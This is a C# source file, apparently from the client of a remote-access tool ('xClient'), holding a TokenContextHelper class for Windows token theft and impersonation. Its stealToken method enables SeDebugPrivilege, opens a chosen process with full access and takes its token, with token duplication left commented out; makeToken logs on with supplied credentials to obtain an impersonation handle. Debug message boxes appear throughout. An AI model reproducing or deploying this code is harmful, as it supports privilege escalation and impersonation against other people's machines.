using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using xClient.Core.Data;
using System.Collections.Generic;
using System.Collections.Concurrent;

namespace xClient.Core.Helper
{ 
    public class TokenContextHelper
    {
        public static void stealToken(ref IntPtr token, int SecurityImpersonate, ref IntPtr duplicateToken, int proc)
        {
            //Check for Debugging
            IntPtr hToken = enableSEDebugPrivilege();
            IntPtr hHandle = attachProcess(proc);
            WindowsAPIHelper.OpenProcessToken(hHandle, (uint)WindowsAPIHelper.DesiredAccess.TOKEN_MAXIMUM_ALLOWED, out token);
            WindowsAPIHelper.SECURITY_ATTRIBUTES sa = new WindowsAPIHelper.SECURITY_ATTRIBUTES();



            //Token Type needs to be Primary if launching a new process, Impersonation if changing ThreadToken (Possibly? How true is this?)
 //           if (WindowsAPIHelper.DuplicateTokenEx(token, (uint)WindowsAPIHelper.DesiredAccess.TOKEN_MAXIMUM_ALLOWED, ref sa, WindowsAPIHelper.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, WindowsAPIHelper.TOKEN_TYPE.TokenImpersonation, out duplicateToken))
 //           {
 //               if (duplicateToken == IntPtr.Zero)
 //               {
 //                   MessageBox.Show("Failed");
 //                   return;
 //               }
 //               else
 //               {
 //                   MessageBox.Show("Succeeded");
 //               }
 //           }
 //           else
 //           {
 //               MessageBox.Show("Unable to duplicate token!");
 //               return;
 //           }
        }
        public static IntPtr attachProcess(int proc)
        {
            Process targetProcess = null;
            try
            {
                targetProcess = Process.GetProcessById(proc);
                MessageBox.Show("Successfully connected to process");
            }
            catch
            {
                MessageBox.Show("Failed to find process with ID: " + proc);
            }
            //Open a handle to the process
            IntPtr ptr = WindowsAPIHelper.OpenProcess(WindowsAPIHelper.ProcessAccessFlags.All, false, targetProcess.Id);
            if (ptr == IntPtr.Zero) { MessageBox.Show("OpenProcess Failed!"); } else { MessageBox.Show("OpenProcess Succeeded: " + ptr.ToInt32().ToString()); }
            return ptr;
        }
        public static ImpersonationSafeHandle makeToken(string password, string username, string domain)
        {

            //Change to LogonUserEx and then use ImpersonateLoggedOnUser
            ImpersonationSafeHandle token2 = new ImpersonationSafeHandle();
            //Logon the user to get a context handle
            try
            {
                if (WindowsAPIHelper.LogonUser(username, domain, password,(int)WindowsAPIHelper.Logon32Type.Interactive, (int)WindowsAPIHelper.Logon32Provider.Default, out token2))
                {
                    GC.KeepAlive(token2);
                    //This may not be necessary?
                    //Need to add a disposal method to free up these resources.
                    return token2;
                        
                }
                else
                {
                    return null;
                }
            }
            catch (Exception e)
            {
                return null;
            }
        }
        private static IntPtr enableSEDebugPrivilege()
        {
            IntPtr hToken = IntPtr.Zero;
            WindowsAPIHelper.LUID luidSEDebugNameValue;
            WindowsAPIHelper.TOKEN_PRIVILEGES tkpPrivileges;

            if (!WindowsAPIHelper.OpenProcessToken(WindowsAPIHelper.GetCurrentProcess(), (uint)WindowsAPIHelper.DesiredAccess.TOKEN_ADJUST_PRIVILEGES | (uint)WindowsAPIHelper.DesiredAccess.TOKEN_QUERY, out hToken))
            {
               MessageBox.Show("OpenProcessToken() failed, error = {0}" + Marshal.GetLastWin32Error() + " SeDebugPrivilege is not available");
                return IntPtr.Zero;
            }
            else
            {
                MessageBox.Show("OpenProcessToken() successfully");
            }

            if (!WindowsAPIHelper.LookupPrivilegeValue(null, WindowsAPIHelper.PrivilegeName.SE_DEBUG_NAME, out luidSEDebugNameValue))
            {
                MessageBox.Show("LookupPrivilegeValue() failed, error = " + Marshal.GetLastWin32Error() + " SeDebugPrivilege is not available");
                WindowsAPIHelper.CloseHandle(hToken);
                return IntPtr.Zero;
            }
            else
            {
                MessageBox.Show("LookupPrivilegeValue() successfully");
            }

            tkpPrivileges.PrivilegeCount = 1;
            tkpPrivileges.Luid = luidSEDebugNameValue;
            tkpPrivileges.Attributes = WindowsAPIHelper.PrivilegeName.SE_PRIVILEGE_ENABLED;

            if (!WindowsAPIHelper.AdjustTokenPrivileges(hToken, false, ref tkpPrivileges, 0, IntPtr.Zero, IntPtr.Zero))
            {
                MessageBox.Show("LookupPrivilegeValue() failed, error = " + Marshal.GetLastWin32Error() + " SeDebugPrivilege is not available");

            }
            else
            {
                MessageBox.Show("SeDebugPrivilege is now available");
            }
            return hToken;

        }
    }
}
